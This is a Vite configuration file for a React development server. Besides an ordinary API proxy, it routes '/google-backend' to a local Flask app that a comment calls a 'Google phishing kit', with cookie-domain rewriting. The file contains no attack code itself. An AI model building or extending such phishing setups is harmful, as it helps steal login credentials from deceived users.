import { defineConfig } from "vite";
import react from "@vitejs/plugin-react";

// https://vitejs.dev/config/
export default defineConfig({
  plugins: [react()],
  server: {
    port: 3000,
    proxy: {
      "/api": {
        target: "http://localhost:4000",
        changeOrigin: true,
      },
      // Google phishing kit (Flask) — run: cd google && python app.py
      "/google-backend": {
        target: "http://127.0.0.1:5055",
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/google-backend/, ""),
        cookieDomainRewrite: "localhost",
      },
    },
  },
});
